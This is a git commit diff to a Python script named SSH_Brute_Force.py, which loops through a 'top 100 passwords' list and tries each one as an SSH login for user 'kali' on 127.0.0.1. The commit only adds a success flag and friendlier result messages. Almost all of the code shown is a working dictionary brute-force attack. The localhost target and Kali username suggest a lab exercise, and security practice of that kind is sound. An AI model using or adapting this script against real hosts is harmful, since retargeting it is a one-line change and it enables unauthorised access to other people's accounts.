ac5a4d8e43c68a0bcb98f01ad8e82a997dbc2099
Turcu Alexandru - Gabriel <127698862+turcug@users.noreply.github.com>
2023-04-19 00:02:49 +0300

    Update SSH_Brute_Force.py

--- SSH_Brute_Force.py
+++ SSH_Brute_Force.py
@@ -7,6 +7,7 @@ SSH_Configurator()
 host = '127.0.0.1'
 username = 'kali'
 attempts = 0
+verification = False
 
 with open("top_100_passwords.txt", "r") as password_list:
 	for password in password_list:
@@ -15,10 +16,14 @@ with open("top_100_passwords.txt", "r") as password_list:
 			print("[{}] Attempting Password: '{}'".format(attempts, password))
 			response = ssh(host = host, user = username, password = password, timeout = 1)
 			if response.connected():
-			 print("[>] Valid password found: '{}'".format(password))
+			 print("\n [>]Congrats!^_^ \n [>] Valid password found: '{}' ".format(password))
+			 verification = True
 			 response.close()
 			 break
 			response.close()
 		except paramiko.ssh_exception.AuthenticationException:
 			print("[X] Invalid Password: '{}'".format(password))
 		attempts +=1
+
+if verification == False:
+	print('[!] Sorry, but the password is not in the given list @_@')
